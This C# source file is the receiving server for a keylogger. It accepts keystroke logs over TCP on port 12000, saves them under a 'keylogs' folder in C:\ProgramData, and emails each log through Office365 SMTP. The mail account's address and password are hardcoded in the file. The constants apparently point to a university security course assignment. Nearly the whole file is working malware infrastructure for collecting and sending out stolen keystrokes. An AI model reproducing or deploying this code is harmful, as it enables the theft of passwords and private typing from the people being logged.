using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Net.Mail;

namespace Networking
{
    class TCPServer
    {
        private const string FROM_EMAIL_ADDRESS = "cmsc414dummy@outlook.com";
        private const string FROM_EMAIL_PASSWORD = "414dummy";
        private const string TO_EMAIL_ADDRESS = "smithcl6@vcu.edu";
       // private static string LOG_FILE_NAME = @"C:\ProgramData"+ DateTime.Now +".txt";
        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;

        public void socketServer()
        {
            int serverPort = 12000;
            TcpListener server = new TcpListener(IPAddress.Any, serverPort);
            server.Start();
            Console.WriteLine("The server is ready to receive");
            while (true)
            {
                Console.WriteLine("Waiting ...");
                TcpClient connectionSocket = server.AcceptTcpClient();
                Console.WriteLine("accept");
                NetworkStream stream = connectionSocket.GetStream();
                byte[] buffer = new byte[2048];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string log = System.Text.Encoding.ASCII.GetString(buffer, 0, bytesRead);
                Console.WriteLine("Message Received:" + log);
                sendMail(log);

                // // specify the file path and name
                // // create a new file
                // using (FileStream fs = File.Create(filePath))
                // {
                    
                // }
                DateTime now = DateTime.Now;
                string formattedDateTime = now.ToString("yyyy-MM-dd-HH-mm-ss");

                if (!Directory.Exists(@"C:\ProgramData\keylogs\"))
                {
                    Directory.CreateDirectory(@"C:\ProgramData\keylogs\");
                    Console.WriteLine("Directory created");
                }
                else
                {
                    Console.WriteLine("Directory already exists");
                }

                StreamWriter output = new StreamWriter(@"C:\ProgramData\keylogs\"+ formattedDateTime +".txt", true);
                output.Write(log);
                output.Close();

                connectionSocket.Close();  // Close connection with client
                // Environment.Exit(0);
            }


            //     FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");

            // // Archive and email the log file if the max size has been reached
            // if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            // {
            //     try
            //     {
            //         // Copy the log file to the archive
            //         logFile.CopyTo(ARCHIVE_FILE_NAME, true);

            //         // Delete the log file
            //         logFile.Delete();

            //         // Email the archive and send email using a new thread
            //         System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
            //         Console.Out.WriteLine("\n\n**MAILSENDING**\n");
            //         mailThread.Start();
            //     }
            //     catch(Exception e)
            //     {
            //         Console.Out.WriteLine(e.Message);
            //     }

            // }

        }

        // Sends email based off incoming keylogs to the specified email address
        public static void sendMail(string log)
        {
            try
            {
                // Read the archive file contents into the email body variable
                // StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
                // string emailBody = input.ReadToEnd();
                // input.Close();

                // Create the email client object
                SmtpClient client = new SmtpClient("smtp.office365.com")
                {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
                    EnableSsl = true,
                };

                // Build the email message
                MailMessage message = new MailMessage
                {
                    From = new MailAddress(FROM_EMAIL_ADDRESS),
                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                    Body = log,
                    IsBodyHtml = false,
                };

                // if (INCLUDE_LOG_AS_ATTACHMENT)
                // {
                //     Attachment attachment = new Attachment(@"C:\ProgramData\mylog_archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
                //     message.Attachments.Add(attachment);
                // }

                // Set the recipient
                message.To.Add(TO_EMAIL_ADDRESS);

                // Send the message
                client.Send(message);

                // Release resources used by the msssage (archive file)
                message.Dispose();
            }
            catch (Exception e)
            {
                Console.Out.WriteLine(e.Message);
            }
        }

    }
}
